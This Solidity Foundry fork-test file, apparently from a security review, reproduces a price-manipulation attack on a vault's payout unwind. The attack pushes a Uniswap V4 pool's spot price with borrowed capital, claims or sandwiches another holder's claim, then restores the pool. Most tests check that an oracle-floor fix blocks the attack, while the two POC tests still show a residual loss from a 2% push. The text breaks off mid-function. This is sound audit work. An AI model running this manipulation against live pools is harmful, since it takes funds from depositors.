// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import {console2} from "forge-std/Test.sol";
import {Vm} from "forge-std/Vm.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {Math} from "@openzeppelin/contracts/utils/math/Math.sol";
import {SafeCast} from "@openzeppelin/contracts/utils/math/SafeCast.sol";
import {IPoolManager} from "@uniswap/v4-core/src/interfaces/IPoolManager.sol";
import {PoolKey} from "@uniswap/v4-core/src/types/PoolKey.sol";
import {PoolId} from "@uniswap/v4-core/src/types/PoolId.sol";
import {Currency} from "@uniswap/v4-core/src/types/Currency.sol";
import {IHooks} from "@uniswap/v4-core/src/interfaces/IHooks.sol";
import {TickMath} from "@uniswap/v4-core/src/libraries/TickMath.sol";
import {IStateView} from "@uniswap/v4-periphery/src/interfaces/IStateView.sol";
import {LiquidityAmounts} from "@uniswap/v4-periphery/src/libraries/LiquidityAmounts.sol";
import {ICoreVault} from "../../../src/interfaces/ICoreVault.sol";
import {ICoreVaultPayouts} from "../../../src/interfaces/ICoreVaultPayouts.sol";
import {ISpokeVault} from "../../../src/interfaces/ISpokeVault.sol";
import {IAdapter} from "../../../src/interfaces/IAdapter.sol";
import {SpokeVaultTypes} from "../../../src/spoke/SpokeVaultTypes.sol";
import {IntegrationPriceBase, PoolActor} from "./IntegrationPriceBase.sol";

/// @notice Part 1.1 of the integration-price review: report 04 C-01 (the automatic unwind is sized and executed at the
///         pool's spot price) reproduced on a fund created by the real FundFactory with the scripts' Mandate, the real
///         ChainlinkPriceSource, the real Aave V3 Pool and the real Uniswap V4 contracts on an Arbitrum One fork.
/// @notice Ported to fix/pp-sc-fix-independent-review (review C-01, security sweep S-2, S-1): the unwind swap is floored
///         at `max(spot, price source) - MAX_UNWIND_SLIPPAGE_BPS` (500), so every crushed-spot variant now reverts the
///         unwind inside the Core Vault's `try` and the fund keeps its position; Share Assets are read at the oracle
///         composition (S-1), so the Idle-paid part of a claim is priced fair. What still pays is a push that stays
///         inside the 5% floor: section 8 measures it on the live pool (S-2 residual, `MAX_UNWIND_SLIPPAGE_BPS` OPEN).
/// @dev Fund: Alice deposits 250,000 USDC; a shareholder contract (the attacker) deposited earlier; the manager keeps a
///      Free Idle buffer, builds a WETH/USDC position in the scripts' hub pool and parks the rest in Aave (the unwind
///      order is V4 then Aave, as script/FundMandate.sol builds it). The attacker's WETH and USDC stand for a flash loan
///      and are checked at the end.
/// @dev Run: ARBITRUM_RPC_URL=https://arb1.arbitrum.io/rpc ARBITRUM_FORK_BLOCK=<head - 300>
///      forge test -j 1 --match-path 'test/review/integration-price/UnwindAttackFork.t.sol' -vv
contract UnwindAttackFork is IntegrationPriceBase {
    uint256 internal constant ALICE_DEPOSIT = 250_000e6;
    uint256 internal constant V4_VALUE = 100_000e6;
    uint256 internal constant BUFFER = 25_000e6;
    uint256 internal constant STAKE = 30_000e6;
    uint256 internal constant FLASH_WETH = 100e18;
    uint256 internal constant FLASH_USDC = 20_000e6;
    uint256 internal constant CRUSH = 1e15; // price pushed to 1/1,000 (1e18 = the start price)

    PoolActor internal attacker;
    bytes32 internal v4Position;

    struct Book {
        uint256 assets;
        uint256 alice;
        uint256 attacker;
        uint256 v4AtOracle;
        uint256 incomeUsd;
        uint256 aavePrincipal;
    }

    Book internal pre;
    Book internal post;

    // ------------------------------------------------------------------ set-up

    /// @dev Alice first (the first deposit), then the attacker's `stake`, then the manager allocates all Free Idle but
    ///      `buffer`, opens one +-range position worth `value` and parks the rest in Aave.
    function _setUpFund(uint256 downPpm, uint256 upPpm, uint256 value, uint256 buffer, uint256 stake) internal {
        _arbitrumOnly();
        _createFund(_pricePlan(SPOKE_CAP), new PoolKey[](0), false);
        _deposit(alice, ALICE_DEPOSIT);
        attacker = new PoolActor(IPoolManager(ARB_V4_POOL_MANAGER));
        deal(ARB_USDC, address(attacker), stake);
        attacker.deposit(core, ARB_USDC, stake);
        _allocate(core.freeIdle() - buffer);
        v4Position = _openAround(hubKey, downPpm, upPpm, value);
        _parkRestInAave();
    }

    function _book() internal view returns (Book memory b) {
        b.assets = core.shareAssets();
        b.alice = _holderValue(alice);
        b.attacker = _wealth(address(attacker));
        b.v4AtOracle = _hubV4PrincipalAtOracle();
        b.incomeUsd =
            hubSpoke.collectedIncome(ARB_USDC) + Math.mulDiv(hubSpoke.collectedIncome(ARB_WETH), _oracle(), 1e18);
        if (hubAavePosition != bytes32(0) && _aaveOpen()) {
            b.aavePrincipal = IAdapter(hubAave).positionValue(hubAavePosition).principal0;
        }
    }

    function _aaveOpen() internal view returns (bool) {
        bytes32[] memory keys = IAdapter(hubAave).positionKeys();
        for (uint256 i; i < keys.length; ++i) {
            if (keys[i] == hubAavePosition) return true;
        }
        return false;
    }

    function _fund(uint256 weth, uint256 usdc) internal {
        deal(ARB_WETH, address(attacker), weth);
        deal(ARB_USDC, address(attacker), IERC20(ARB_USDC).balanceOf(address(attacker)) + usdc);
    }

    /// @notice The round trip alone (push, liquidity in and out, restore), no claim: what the attacker pays the pool.
    function _roundTripCost(PoolActor.Leg[] memory legs) internal returns (int256 cost) {
        uint256 snap = vm.snapshotState();
        uint256 before = _wealth(address(attacker));
        attacker.push(legs);
        attacker.restore(legs);
        cost = int256(before) - int256(_wealth(address(attacker)));
        vm.revertToState(snap);
    }

    function _logOutcome(string memory title, ICoreVault.PayoutReceipt memory r, uint256 gas) internal view {
        console2.log("=====", title);
        console2.log("oracle USDC per WETH (6dp)", _oracle());
        console2.log("free idle / claim wanted (gross paid)", core.freeIdle(), r.usdcGross);
        console2.log("unwind proceeds", r.unwindProceeds);
        console2.log("V4 principal at oracle before / after", pre.v4AtOracle, post.v4AtOracle);
        console2.log("Aave principal before / after", pre.aavePrincipal, post.aavePrincipal);
        console2.log("Share Assets before / after", pre.assets, post.assets);
        console2.log("Alice value before / after", pre.alice, post.alice);
        console2.log("Alice value change");
        console2.logInt(int256(post.alice) - int256(pre.alice));
        console2.log("fund income realized by the exits (USD)", post.incomeUsd - pre.incomeUsd);
        console2.log("attacker wealth before / after", pre.attacker, post.attacker);
        console2.log("attacker profit (at oracle)");
        console2.logInt(int256(post.attacker) - int256(pre.attacker));
        console2.log("hub positions left", hubSpoke.positions().length);
        console2.log("attack gas", gas);
    }

    /// @dev What the unwind did, from the hub Spoke Vault's events (first V4 exit and first swap), and whether the
    ///      Core Vault caught a reverting unwind.
    uint256 internal exitWeth;
    uint256 internal exitUsdc;
    uint256 internal swapIn;
    uint256 internal swapOut;
    bool internal unwindFailed;

    function _readUnwindEvents(Vm.Log[] memory logs) internal {
        (exitWeth, exitUsdc, swapIn, swapOut) = (0, 0, 0, 0);
        unwindFailed = _sawUnwindFailed(logs);
        bool exitSeen;
        bool swapSeen;
        for (uint256 i; i < logs.length; ++i) {
            if (logs[i].emitter != address(hubSpoke)) continue;
            bytes32 t = logs[i].topics[0];
            if (!exitSeen && (t == ISpokeVault.PositionClosed.selector || t == ISpokeVault.PositionDecreased.selector))
            {
                if (address(uint160(uint256(logs[i].topics[1]))) != hubUniswap) continue;
                IAdapter.Amounts memory a = abi.decode(logs[i].data, (IAdapter.Amounts));
                (exitWeth, exitUsdc, exitSeen) = (a.principal0, a.principal1, true);
            } else if (!swapSeen && t == ISpokeVault.Swapped.selector) {
                (,, swapIn, swapOut) = abi.decode(logs[i].data, (address, address, uint256, uint256));
                swapSeen = true;
            }
        }
    }

    /// @notice What each fix option would have compared, for the first V4 step of the unwind just run.
    /// @param oracle0 WETH the exited liquidity holds at the oracle-implied composition (option d reference).
    /// @param oracle1 USDC the exited liquidity holds at the oracle-implied composition.
    function _logFixChecks(uint256 oracle0, uint256 oracle1) internal view {
        uint256 spot1e18 =
            Math.mulDiv(Math.mulDiv(attacker.sqrtAtCall(), attacker.sqrtAtCall(), 1 << 96), 1e18, 1 << 96);
        console2.log("(b) slot0 at the claim vs oracle, ppm of the oracle", Math.mulDiv(spot1e18, 1e6, _oracle()));
        console2.log("(c) unwind swap: WETH in, USDC out", swapIn, swapOut);
        console2.log("(c) oracle floor at 95% for that WETH", Math.mulDiv(swapIn, _oracle(), 1e18) * 95 / 100);
        console2.log("(d) exit returned WETH / USDC", exitWeth, exitUsdc);
        console2.log("(d) same liquidity at the oracle composition WETH / USDC", oracle0, oracle1);
    }

    function _attack(PoolActor.Leg[] memory legs, bytes memory hints)
        internal
        returns (ICoreVault.PayoutReceipt memory r, uint256 gas)
    {
        pre = _book();
        vm.recordLogs();
        uint256 g = gasleft();
        r = attacker.attack(legs, core, hints);
        gas = g - gasleft();
        _readUnwindEvents(vm.getRecordedLogs());
        post = _book();
        for (uint256 i; i < legs.length; ++i) {
            (uint160 sqrtAfter,,,) = IStateView(ARB_V4_STATE_VIEW).getSlot0(legs[i].key.toId());
            assertEq(sqrtAfter, legs[i].restoreTo, "every pool is back at its exact start price");
        }
        // Flash capital: the WETH is back to within 1 WETH (any shortfall is bought back from the USDC the attacker
        // ends with, which the wealth measure already nets).
        assertGe(IERC20(ARB_WETH).balanceOf(address(attacker)) + 1e18, FLASH_WETH, "flash WETH returned");
        assertGe(IERC20(ARB_USDC).balanceOf(address(attacker)), FLASH_USDC / 2, "flash USDC returned");
    }

    /// @dev The fixed outcome of a crushed-spot claim (S-2): the unwind reverted under the oracle floor, the claim was
    ///      paid from Idle only, every V4 position is intact, the holder who stays lost nothing (one unit of rounding
    ///      at most) and the round trip cost the attacker its pool fees.
    function _assertCrushBlocked(ICoreVault.PayoutReceipt memory r, uint256 positionsKept) internal view {
        assertTrue(unwindFailed, "UnwindForPayoutFailed: the oracle floor reverted the unwind");
        assertEq(r.unwindProceeds, 0, "nothing was unwound");
        assertEq(hubSpoke.positions().length, positionsKept, "the fund keeps every position");
        assertEq(post.v4AtOracle, pre.v4AtOracle, "V4 principal untouched");
        assertGe(post.alice + 1, pre.alice, "the holder who stays loses nothing");
        assertLt(int256(post.attacker), int256(pre.attacker), "the round trip costs the attacker its pool fees");
    }

    // ------------------------------------------------------------------ 1. shapes, deep push, claim above Free Idle

    function _oracleComposition(bytes32 positionKey) internal view returns (uint256 a0, uint256 a1) {
        IAdapter.PositionValue memory v = IAdapter(hubUniswap).positionValue(positionKey);
        (a0, a1) = _amountsAt(_oracleSqrtPrice(), v.tickLower, v.tickUpper, v.liquidity);
    }

    /// @dev e5c778a: in each shape the whole position closed (99,684 / 99,689 / 99,685 at the oracle); Alice lost
    ///      88,915 / 88,917 / 88,894 and the attacker gained 88,318 / 88,319 / 88,274.
    function _deepCrush(uint256 downPpm, uint256 upPpm, string memory title) internal {
        _setUpFund(downPpm, upPpm, V4_VALUE, BUFFER, STAKE);
        attacker.requestPayout(core, _holderValue(address(attacker)), ICoreVaultPayouts.PayoutMode.Instant);
        _fund(FLASH_WETH, FLASH_USDC);
        PoolActor.Leg[] memory legs = _one(_crushLeg(hubKey, ARB_V4_STATE_VIEW, CRUSH));
        int256 cost = _roundTripCost(legs);
        (uint256 o0, uint256 o1) = _oracleComposition(v4Position);
        (ICoreVault.PayoutReceipt memory r, uint256 gas) = _attack(legs, "");
        _logOutcome(title, r, gas);
        console2.log("round trip alone costs the attacker (USD 6dp)");
        console2.logInt(cost);
        _logFixChecks(o0, o1);
        _assertCrushBlocked(r, 2);
        assertGt(r.usdcOutstanding, 0, "Partial Payout from Free Idle only, the rest stays requested");
    }

    function test_REVIEW_C01_deepPush_inRangePlusMinus5() public {
        _deepCrush(50_000, 50_000, "deep push, in-range +-5%");
    }

    function test_REVIEW_C01_deepPush_inRangePlusMinus10() public {
        _deepCrush(100_000, 100_000, "deep push, in-range +-10%");
    }

    function test_REVIEW_C01_deepPush_inRangePlusMinus50() public {
        _deepCrush(500_000, 500_000, "deep push, in-range +-50%");
    }

    // ------------------------------------------------------------------ 2. edge push: a partial exit sized at spot

    /// @dev The pool is pushed one tick spacing under the range (-5.2%), no liquidity is left behind. e5c778a: the
    ///      vault's own 13.9 WETH sale broke its 5% spot floor and the unwind reverted (report 04 L-01 (3)); the
    ///      oracle floor (S-2) now stops it a fortiori.
    function test_REVIEW_C01_edgePush_partialExit_plusMinus5() public {
        _setUpFund(50_000, 50_000, V4_VALUE, BUFFER, 60_000e6);
        attacker.requestPayout(core, _holderValue(address(attacker)), ICoreVaultPayouts.PayoutMode.Instant);
        _fund(FLASH_WETH, FLASH_USDC);
        PoolActor.Leg[] memory legs =
            _one(_pushLeg(hubKey, ARB_V4_STATE_VIEW, TickMath.getSqrtPriceAtTick(lastLower - hubKey.tickSpacing)));
        int256 cost = _roundTripCost(legs);
        (ICoreVault.PayoutReceipt memory r, uint256 gas) = _attack(legs, "");
        _logOutcome("edge push, in-range +-5%, partial exit", r, gas);
        console2.log("round trip alone costs the attacker (USD 6dp)");
        console2.logInt(cost);
        _logFixChecks(0, 0);
        _assertCrushBlocked(r, 2);
    }

    /// @dev Same, with liquidity left under the pushed price so the vault's sale would clear a spot floor: the exit is
    ///      sized at spot and the WETH would be sold at the pushed price. `pushPpm` is the pushed price in ppm of the
    ///      start price.
    function _edgeWithLiquidity(uint256 pushPpm, string memory title)
        internal
        returns (ICoreVault.PayoutReceipt memory r)
    {
        _setUpFund(50_000, 50_000, V4_VALUE, BUFFER, 60_000e6);
        attacker.requestPayout(core, _holderValue(address(attacker)), ICoreVaultPayouts.PayoutMode.Instant);
        _fund(FLASH_WETH, 200_000e6);
        uint160 pushTo = uint160(Math.mulDiv(hubSqrtP0Now(), Math.sqrt(pushPpm * 1e12), 1e9));
        PoolActor.Leg[] memory legs = _one(_jitLeg(hubKey, ARB_V4_STATE_VIEW, pushTo, 40e18));
        int256 cost = _roundTripCost(legs);
        IAdapter.PositionValue memory before = IAdapter(hubUniswap).positionValue(v4Position);
        uint256 gas;
        (r, gas) = _attack(legs, "");
        _logOutcome(title, r, gas);
        console2.log("round trip alone costs the attacker (USD 6dp)");
        console2.logInt(cost);
        uint128 exited = before.liquidity - IAdapter(hubUniswap).positionValue(v4Position).liquidity;
        (uint256 o0, uint256 o1) = _amountsAt(_oracleSqrtPrice(), before.tickLower, before.tickUpper, exited);
        uint256 exitedAtOracle = o1 + Math.mulDiv(o0, _oracle(), 1e18);
        console2.log("exited share of the liquidity (ppm)", uint256(exited) * 1e6 / before.liquidity);
        console2.log("exited liquidity at the oracle composition (USD)", exitedAtOracle);
        console2.log("exited amounts at oracle-price value (USD)", exitUsdc + Math.mulDiv(exitWeth, _oracle(), 1e18));
        console2.log("value the V4 step turned into USDC", exitUsdc + swapOut);
        _logFixChecks(o0, o1);
    }

    /// @dev DEC-144: the claimant's Payout Fee now stays in Idle and mostly goes to Alice, which more than covers the
    ///      sale's market cost at today's pool depth; net of her part of that fee, the 2% push still costs her.
    function _assertAliceLosesNetOfTheFee(ICoreVault.PayoutReceipt memory r) internal view {
        uint256 feePart =
            Math.mulDiv(r.payoutFee, IERC20(shareToken).balanceOf(alice), IERC20(shareToken).totalSupply());
        assertGt(
            pre.alice + feePart, post.alice + 100e6, "Alice still loses over 100 USDC on a 2% push, net of the fee"
        );
    }

    function hubSqrtP0Now() internal view returns (uint160 s) {
        (s,,,) = IStateView(ARB_V4_STATE_VIEW).getSlot0(hubKey.toId());
    }

    /// @dev e5c778a: 37.1% of the liquidity, worth 36,961 at the oracle composition, became 35,053 USDC; Alice -1,705.
    function test_REVIEW_C01_edgePushWithLiquidity_underTheRange_plusMinus5() public {
        ICoreVault.PayoutReceipt memory r =
            _edgeWithLiquidity(948_000, "push to -5.2% (under a +-5% range), liquidity under it");
        _assertCrushBlocked(r, 2);
    }

    /// @dev STILL PRESENT inside the floor (S-2 residual). e5c778a: the fund lost 1.55% of the exited value (Alice
    ///      -504 on a 35,500 unwind). The 2% push is inside `MAX_UNWIND_SLIPPAGE_BPS` (500), so the floor lets it pass.
    function test_POC_REVIEW_C01_pushInsideTheFloor_2pct_jitLiquidity() public {
        ICoreVault.PayoutReceipt memory r =
            _edgeWithLiquidity(980_000, "push to -2% (inside the 5% floor), liquidity under it");
        assertFalse(unwindFailed, "the floor lets a 2% push through");
        assertGt(r.unwindProceeds, 30_000e6, "the unwind ran");
        assertEq(hubSpoke.positions().length, 2, "the V4 position was only decreased");
        _assertAliceLosesNetOfTheFee(r);
        assertGe(swapOut, Math.mulDiv(swapIn, _oracle(), 1e18) * 95 / 100, "the sale is above the oracle floor");
    }

    /// @dev Same 2% push with nothing left under the price: the vault's sale fills against the pool's own liquidity
    ///      and whoever restores the pool buys that WETH back. e5c778a: the fund lost 1.74% of the exited value (Alice
    ///      -585).
    function test_POC_REVIEW_C01_pushInsideTheFloor_2pct_saleIntoNativeLiquidity() public {
        _setUpFund(50_000, 50_000, V4_VALUE, BUFFER, 60_000e6);
        attacker.requestPayout(core, _holderValue(address(attacker)), ICoreVaultPayouts.PayoutMode.Instant);
        _fund(FLASH_WETH, 200_000e6);
        uint160 pushTo = uint160(Math.mulDiv(hubSqrtP0Now(), Math.sqrt(uint256(980_000) * 1e12), 1e9));
        PoolActor.Leg[] memory legs = _one(_pushLeg(hubKey, ARB_V4_STATE_VIEW, pushTo));
        IAdapter.PositionValue memory before = IAdapter(hubUniswap).positionValue(v4Position);
        (ICoreVault.PayoutReceipt memory r, uint256 gas) = _attack(legs, "");
        _logOutcome("push to -2% (inside the 5% floor), sale into the pool's own liquidity", r, gas);
        uint128 exited = before.liquidity - IAdapter(hubUniswap).positionValue(v4Position).liquidity;
        (uint256 o0, uint256 o1) = _amountsAt(_oracleSqrtPrice(), before.tickLower, before.tickUpper, exited);
        console2.log("exited liquidity at the oracle composition (USD)", o1 + Math.mulDiv(o0, _oracle(), 1e18));
        console2.log("value the V4 step turned into USDC", exitUsdc + swapOut);
        console2.log("sale price vs oracle (ppm)", Math.mulDiv(swapOut, 1e24, Math.mulDiv(swapIn, _oracle(), 1)));
        _logFixChecks(o0, o1);
        assertFalse(unwindFailed, "the floor lets a 2% push through");
        assertGt(r.unwindProceeds, 30_000e6, "the unwind ran");
        _assertAliceLosesNetOfTheFee(r);
    }

    // ------------------------------------------------------------------ 3. several positions, one pool / two pools

    /// @dev e5c778a: one claim closed both positions (+88,337 for the attacker).
    function test_REVIEW_C01_twoPositionsInOnePool_neitherIsTaken() public {
        _arbitrumOnly();
        _createFund(_pricePlan(SPOKE_CAP), new PoolKey[](0), false);
        _deposit(alice, ALICE_DEPOSIT);
        attacker = new PoolActor(IPoolManager(ARB_V4_POOL_MANAGER));
        deal(ARB_USDC, address(attacker), STAKE);
        attacker.deposit(core, ARB_USDC, STAKE);
        _allocate(core.freeIdle() - BUFFER);
        v4Position = _openAround(hubKey, 50_000, 50_000, 50_000e6);
        _openAround(hubKey, 500_000, 500_000, 50_000e6);
        _parkRestInAave();
        assertEq(hubSpoke.positions().length, 3, "two V4 positions and Aave");
        attacker.requestPayout(core, _holderValue(address(attacker)), ICoreVaultPayouts.PayoutMode.Instant);
        _fund(FLASH_WETH, FLASH_USDC);
        (ICoreVault.PayoutReceipt memory r, uint256 gas) =
            _attack(_one(_crushLeg(hubKey, ARB_V4_STATE_VIEW, CRUSH)), "");
        _logOutcome("two positions (+-5% and +-50%) in the scripts' pool", r, gas);
        _assertCrushBlocked(r, 3);
    }

    /// @dev A Mandate with a second hub V4 pool (the live WETH/USDC 0.3% pool) in the unwind order before Aave. The
    ///      stale 0.3% pool is first arbitraged to the oracle price; the fund holds a position in each pool.
    ///      e5c778a: one claim closed both pools' positions (+88,262).
    function test_REVIEW_C01_twoPools_neitherIsTaken() public {
        _arbitrumOnly();
        PoolKey memory second = PoolKey(Currency.wrap(ARB_WETH), Currency.wrap(ARB_USDC), 3000, 60, IHooks(address(0)));
        PoolKey[] memory extra = new PoolKey[](1);
        extra[0] = second;
        _createFund(_pricePlan(SPOKE_CAP), extra, true);
        _arbTo(arbitrumRouter, second, ARB_V4_STATE_VIEW, _oracleSqrtPrice());
        _deposit(alice, ALICE_DEPOSIT);
        attacker = new PoolActor(IPoolManager(ARB_V4_POOL_MANAGER));
        deal(ARB_USDC, address(attacker), STAKE);
        attacker.deposit(core, ARB_USDC, STAKE);
        _allocate(core.freeIdle() - BUFFER);
        _openAround(hubKey, 100_000, 100_000, 60_000e6);
        _openAround(second, 100_000, 100_000, 40_000e6);
        _parkRestInAave();
        assertEq(hubSpoke.positions().length, 3, "one position per V4 pool and Aave");

        attacker.requestPayout(core, _holderValue(address(attacker)), ICoreVaultPayouts.PayoutMode.Instant);
        _fund(FLASH_WETH, FLASH_USDC);
        PoolActor.Leg[] memory legs = new PoolActor.Leg[](2);
        legs[0] = _crushLeg(hubKey, ARB_V4_STATE_VIEW, CRUSH);
        legs[1] = _crushLeg(second, ARB_V4_STATE_VIEW, CRUSH);
        int256 cost = _roundTripCost(legs);
        (ICoreVault.PayoutReceipt memory r, uint256 gas) = _attack(legs, "");
        _logOutcome("one position in each of two Mandate pools", r, gas);
        console2.log("round trip alone costs the attacker (USD 6dp)");
        console2.logInt(cost);
        _assertCrushBlocked(r, 3);
    }

    // ------------------------------------------------------------------ 4. minimum stake, Standard payout

    /// @dev The manager allocated all Free Idle (the attacker deposited before). One share is the whole stake.
    ///      e5c778a: +99,496 for the attacker. Now the crushed unwind reverts, nothing is payable from a Free Idle of 0,
    ///      so the claim, and with it the whole attack transaction, reverts `InsufficientFreeIdle`.
    function test_REVIEW_C01_minimumStake_oneShare_freeIdleZero_attackReverts() public {
        _setUpFund(100_000, 100_000, V4_VALUE, 0, 2e6);
        assertEq(IERC20(shareToken).balanceOf(address(attacker)), 1e18, "one whole share");
        assertEq(core.freeIdle(), 0);
        attacker.requestPayout(core, 2e6, ICoreVaultPayouts.PayoutMode.Instant);
        _fund(FLASH_WETH, FLASH_USDC);
        PoolActor.Leg[] memory legs = _one(_crushLeg(hubKey, ARB_V4_STATE_VIEW, 1e12)); // 1/1,000,000
        uint256 v4Before = _hubV4PrincipalAtOracle();
        vm.expectPartialRevert(ICoreVault.InsufficientFreeIdle.selector);
        attacker.attack(legs, core, "");
        assertEq(hubSpoke.positions().length, 2, "position intact");
        assertEq(_hubV4PrincipalAtOracle(), v4Before);
    }

    /// @dev e5c778a: +99,496 with a Standard request after the term, just the same.
    function test_REVIEW_C01_minimumStake_standardPayout_attackReverts() public {
        _setUpFund(100_000, 100_000, V4_VALUE, 0, 2e6);
        attacker.requestPayout(core, 2e6, ICoreVaultPayouts.PayoutMode.Standard);
        assertEq(core.payoutRequest(address(attacker)).reserved, 0, "nothing reserved: Free Idle was 0");
        _advance(72 hours + 1);
        _fund(FLASH_WETH, FLASH_USDC);
        PoolActor.Leg[] memory legs = _one(_crushLeg(hubKey, ARB_V4_STATE_VIEW, 1e12));
        vm.expectPartialRevert(ICoreVault.InsufficientFreeIdle.selector);
        attacker.attack(legs, core, "");
        assertEq(hubSpoke.positions().length, 2, "position intact");
    }

    // ------------------------------------------------------------------ 5. a third party around someone else's claim

    /// @dev Bruno is an ordinary shareholder whose Instant claim exceeds Free Idle. The attacker holds no share: it
    ///      pushes the pool before Bruno's claim and restores it after (same block, ordering assumed).
    function _thirdPartySetUp() internal returns (PoolActor.Leg[] memory legs) {
        _setUpFund(100_000, 100_000, V4_VALUE, BUFFER, 2e6);
        // The attacker contract holds one share only to reuse the set-up; the sandwich below never claims with it.
        _deposit(bruno, STAKE);
        _allocate(core.freeIdle() - BUFFER);
        _parkMoreInAave();
        vm.prank(bruno);
        core.requestPayout(STAKE * 99 / 100, ICoreVaultPayouts.PayoutMode.Instant);
        _fund(FLASH_WETH, FLASH_USDC);
        legs = _one(_crushLeg(hubKey, ARB_V4_STATE_VIEW, CRUSH));
    }

    function _parkMoreInAave() internal {
        uint256 rest = hubSpoke.unallocatedBalance(ARB_USDC);
        vm.prank(manager);
        hubSpoke.increasePosition(hubAave, hubAavePosition, rest, 0, abi.encode(rest));
    }

    /// @dev e5c778a: +99,422 for the attacker; Alice lost 88,912 and Bruno 11,109.
    function test_REVIEW_C01_thirdPartyAroundSomeoneElsesClaim() public {
        PoolActor.Leg[] memory legs = _thirdPartySetUp();
        pre = _book();
        uint256 brunoBefore = _wealth(bruno);
        attacker.push(legs);
        vm.recordLogs();
        vm.prank(bruno);
        ICoreVault.PayoutReceipt memory r = core.claimPayout("");
        _readUnwindEvents(vm.getRecordedLogs());
        attacker.restore(legs);
        post = _book();
        _logOutcome("third party around Bruno's claim (no hint)", r, 0);
        console2.log("Bruno wealth change (6dp)");
        int256 brunoChange = int256(_wealth(bruno)) - int256(brunoBefore);
        console2.logInt(brunoChange);
        _assertCrushBlocked(r, 2);
    }

    /// @dev Fix option (c) emulated through the claimant's own hint, as at e5c778a: Bruno floors the WETH swap at the
    ///      oracle price less 3%. The vault's own S-2 floor already reverts the unwind; the e5c778a residual, Bruno's
    ///      Idle-paid part priced at the pushed composition (C-02), is gone too (S-1): Alice loses nothing.
    function test_REVIEW_C01_thirdParty_oracleFloorHint_noShareRouteResidual() public {
        PoolActor.Leg[] memory legs = _thirdPartySetUp();
        bytes memory hints = _oracleHints(STAKE * 99 / 100 - core.freeIdle());
        pre = _book();
        attacker.push(legs);
        vm.recordLogs();
        vm.prank(bruno);
        ICoreVault.PayoutReceipt memory r = core.claimPayout(hints);
        _readUnwindEvents(vm.getRecordedLogs());
        attacker.restore(legs);
        post = _book();
        _logOutcome("third party around Bruno's claim, Bruno's hint floors the swap at the oracle", r, 0);
        assertTrue(unwindFailed, "UnwindForPayoutFailed: the floor reverted the unwind");
        assertEq(hubSpoke.positions().length, 2, "the V4 position is intact");
        assertEq(r.unwindProceeds, 0);
        assertGt(r.usdcOutstanding, 0, "Partial Payout from Free Idle only");
        assertGe(post.alice + 1, pre.alice, "no residual: the Share Price is read at the oracle composition (S-1)");
    }

    function _oracleHints(uint256 shortfall) internal view returns (bytes memory) {
        IAdapter.PositionValue memory v = IAdapter(hubUniswap).positionValue(v4Position);
        uint256 value = v.principal1 + IAdapter(hubUniswap).spotQuote(hubPoolId, ARB_WETH, v.principal0);
        uint256 target = shortfall + shortfall * 200 / 10_000;
        uint256 wethOut = value <= target ? v.principal0 : Math.mulDiv(v.principal0, target, value);
        SpokeVaultTypes.UnwindSwap[] memory swaps = new SpokeVaultTypes.UnwindSwap[](1);
        swaps[0] = SpokeVaultTypes.UnwindSwap({
            adapter: hubUniswap,
            poolKey: hubPoolId,
            tokenIn: ARB_WETH,
            minAmountOut: Math.mulDiv(wethOut, _oracle(), 1e18) * 97 / 100,
            params: _swapParams()
        });
        SpokeVaultTypes.UnwindHint[] memory hints = new SpokeVaultTypes.UnwindHint[](2);
        hints[0] = SpokeVaultTypes.UnwindHint({swaps: swaps});
        hints[1] = SpokeVaultTypes.UnwindHint({swaps: new SpokeVaultTypes.UnwindSwap[](0)});
        return abi.encode(hints);
    }

    function _sawUnwindFailed(Vm.Log[] memory logs) internal view returns (bool) {
        for (uint256 i; i < logs.length; ++i) {
            if (
                logs[i].emitter == address(core)
                    && logs[i].topics[0] == ICoreVaultPayouts.UnwindForPayoutFailed.selector
            ) {
                return true;
            }
        }
        return false;
    }

    // ------------------------------------------------------------------ 6. V4 flash accounting cannot wrap the unwind

    /// @dev Report 04 (checked and found correct, still holds): the push must use outside capital. Inside the
    ///      attacker's own unlock, the vault's exit calls the PositionManager, whose `unlock` reverts AlreadyUnlocked:
    ///      the unwind fails and the claim is paid from Free Idle only; the position survives.
    function test_REVIEW_C01_refute_flashAccountingCannotWrapTheUnwind() public {
        _setUpFund(100_000, 100_000, V4_VALUE, BUFFER, STAKE);
        attacker.requestPayout(core, _holderValue(address(attacker)), ICoreVaultPayouts.PayoutMode.Instant);
        _fund(FLASH_WETH, FLASH_USDC);
        PoolActor.Leg memory leg = _crushLeg(hubKey, ARB_V4_STATE_VIEW, CRUSH);
        vm.recordLogs();
        bytes memory ret = attacker.around(
            hubKey, true, leg.pushTo, address(core), abi.encodeCall(ICoreVaultPayouts.claimPayout, (""))
        );
        bool failed = _sawUnwindFailed(vm.getRecordedLogs());
        ICoreVault.PayoutReceipt memory r = abi.decode(ret, (ICoreVaultPayouts.PayoutReceipt));
        assertTrue(failed, "the unwind reverted inside the attacker's unlock");
        assertEq(r.unwindProceeds, 0);
        assertEq(hubSpoke.positions().length, 2, "position intact");
    }

    // ------------------------------------------------------------------ 7. the fund as a small LP in a deep pool

    /// @dev A whale LP adds liquidity to the scripts' pool over [0.8 P, 1.25 P] until its in-range liquidity matches
    ///      the live Arbitrum V3 WETH/USDC 0.05% pool (3.8e18 at the probe block), then the fund enters.
    function _deepPool(uint256 value) internal {
        _arbitrumOnly();
        _createFund(_pricePlan(SPOKE_CAP), new PoolKey[](0), false);
        PoolActor whale = new PoolActor(IPoolManager(ARB_V4_POOL_MANAGER));
        deal(ARB_WETH, address(whale), 20_000e18);
        deal(ARB_USDC, address(whale), 60_000_000e6);
        (int24 lo, int24 hi) = _ticksAround(hubKey, 200_000, 250_000);
        whale.modify(hubKey, lo, hi, 3.8e18);
        console2.log("in-range liquidity with the whale", IStateView(ARB_V4_STATE_VIEW).getLiquidity(hubKey.toId()));
        _deposit(alice, ALICE_DEPOSIT);
        attacker = new PoolActor(IPoolManager(ARB_V4_POOL_MANAGER));
        deal(ARB_USDC, address(attacker), STAKE);
        attacker.deposit(core, ARB_USDC, STAKE);
        _allocate(core.freeIdle() - BUFFER);
        v4Position = _openAround(hubKey, 100_000, 100_000, value);
        _parkRestInAave();
        attacker.requestPayout(core, _holderValue(address(attacker)), ICoreVaultPayouts.PayoutMode.Instant);
    }

    function _deepPoolAttack(uint256 value, string memory title) internal returns (int256 profit) {
        _deepPool(value);
        _fund(20_000e18, 1_000_000e6);
        PoolActor.Leg[] memory legs = _one(_crushLeg(hubKey, ARB_V4_STATE_VIEW, CRUSH));
